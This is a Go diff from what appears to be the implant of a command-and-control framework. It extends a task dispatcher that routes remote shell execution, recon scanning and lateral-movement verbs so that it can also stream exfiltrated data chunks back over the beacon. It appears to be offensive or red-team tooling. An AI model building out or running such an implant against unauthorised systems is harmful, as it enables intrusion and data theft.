@@ -64,24 +64,34 @@ func NewRunnerWithEnroll(enroll EnrollBundle, logger *log.Logger) *Runner {
 	return r
 }
 
-// Dispatch runs verb against arguments and returns the wire outcome plus the
-// captured output (combined stdout/stderr). An unknown verb reports Failed with
-// a clear message rather than panicking, so the operator sees the cause.
-func (r *Runner) Dispatch(ctx context.Context, verb, arguments string) (rodpb.TaskOutcome, string) {
+// Dispatch runs verb against arguments and returns the wire outcome, the
+// captured output (combined stdout/stderr), and any out-of-band chunks the
+// handler produced. An unknown verb reports Failed with a clear message rather
+// than panicking, so the operator sees the cause. The chunks slice is non-nil
+// only for verbs that stream bytes alongside the task result (exfil.push); the
+// beacon loop writes the TaskResult first, then iterates the chunks as
+// ExfilChunk frames (architecture.md Sec 10.1 exfil). All current handlers
+// return a nil slice.
+func (r *Runner) Dispatch(ctx context.Context, verb, arguments string) (rodpb.TaskOutcome, string, []rodpb.ExfilChunk) {
 	switch verb {
 	case "shell.exec":
-		return r.shellExec(ctx, arguments)
+		outcome, output := r.shellExec(ctx, arguments)
+		return outcome, output, nil
 	case "recon.portscan":
-		return r.portScan(ctx, arguments)
+		outcome, output := r.portScan(ctx, arguments)
+		return outcome, output, nil
 	case "recon.hostenum":
-		return r.hostEnum(ctx, arguments)
+		outcome, output := r.hostEnum(ctx, arguments)
+		return outcome, output, nil
 	case "recon.service":
-		return r.serviceProbe(ctx, arguments)
+		outcome, output := r.serviceProbe(ctx, arguments)
+		return outcome, output, nil
 	case "lateral.move":
-		return r.lateralMove(ctx, arguments)
+		outcome, output := r.lateralMove(ctx, arguments)
+		return outcome, output, nil
 	default:
 		r.log.Printf("unknown verb: %s", verb)
-		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "unknown verb: " + verb
+		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "unknown verb: " + verb, nil
 	}
 }
 
